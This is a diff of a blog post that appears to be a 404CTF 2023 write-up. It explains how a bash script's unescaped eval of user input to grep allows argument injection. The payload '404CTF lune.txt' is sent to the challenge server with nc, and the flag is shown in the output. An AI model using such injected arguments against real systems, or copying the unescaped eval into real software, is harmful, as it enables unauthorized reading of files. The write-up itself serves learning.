@@ -1,13 +1,16 @@
 ---
 layout: post
 title: 404CTF 2023 | Je veux la lune !
-date: 2023-06-05 23:40:00
+image: /assets/images/404ctf/image-je-veux-la-lune.png
+date: 2023-06-06 23:40:00
 categories: [404ctf, pwn]
 ---
 
+This challenge was part of the [404CTF 2023](https://www.404ctf.fr/), organized by the General Directorate for External Security (DGSE) and Télécom SudParis.
+
 # Challenge Description
 
-![Challenge Description](/assets/images/404ctf/description-je-veux-la-lune.png)
+![Challenge Description]({{site.baseurl}}/assets/images/404ctf/description-je-veux-la-lune.png)
 
 >> Caligula est assis seul devant une table du café. Il y a devant lui 5 tasses vides empilées, et une 6e qu'il sirote lentement, ainsi qu'un ordinateur qu'il regarde fixement. Des cernes profonds creusent son visage. Il lève des yeux étonnamment vifs vers vous alors que vous vous approchez de lui.
 >>
@@ -21,18 +24,25 @@ categories: [404ctf, pwn]
 >>
 >> chlmine#0024
 
+# Analysis
 
 The given `donne_moi_la_lune.sh` file contains a simple script :
+
 ```sh
 #!/bin/bash
 
 Caligula=Caius
 
-listePersonnes="Cherea Caesonia Scipion Senectus Lepidus Caligula Caius Drusilla"
+listePersonnes="Cherea Caesonia Scipion Senectus Lepidus Caligula Caius
+ Drusilla"
 
-echo "Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !
+echo "Bonjour Caligula, ceci est un message de Hélicon. Je sais que
+ les actionnaires de ton entreprise veulent se débarrasser de toi, je
+ me suis donc dépêché de t'obtenir la lune, elle est juste là dans le
+ fichier lune.txt !
 
-En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?"
+En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia,
+ Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?"
 read personne
 eval "grep -wie ^$personne informations.txt"
 
@@ -48,10 +58,33 @@ De qui d'autre tu veux que je te parle ?"
     bob=$(grep -wie ^$personne informations.txt)
     
     if [ -z "$bob" ]; then
-        echo "Je n'ai pas compris de qui tu parlais. Dis-moi stop si tu veux que je m'arrête, et envoie l'un des noms que j'ai cités si tu veux des informations."
+        echo "Je n'ai pas compris de qui tu parlais. Dis-moi stop si
+         tu veux que je m'arrête, et envoie l'un des noms que j'ai
+         cités si tu veux des informations."
     else
         echo $bob
     fi  
 
 done
 ```
+
+According to the prompt, it looks like the goal is to get the content of the file `lune.txt`. To do so, we can see in the script that our input is not escaped and is directly passed to `grep`, allowing code injection. We are then able to recover the flag with a simple payload like `404CTF lune.txt` (note the space, which makes bash interpret the next string as another argument), which will result in the following `grep` command, effectively showing all lines beginning with `404CTF` on both files :
+
+```sh
+grep -wie ^404CTF lune.txt informations.txt
+```
+
+# Running on the remote server
+
+Let's try this payload !
+```
+& echo "404CTF lune.txt" | nc challenges.404ctf.fr 31215
+
+Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !
+
+En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?
+
+lune.txt:404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}
+```
+
+> ✅ Flag : `404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}`
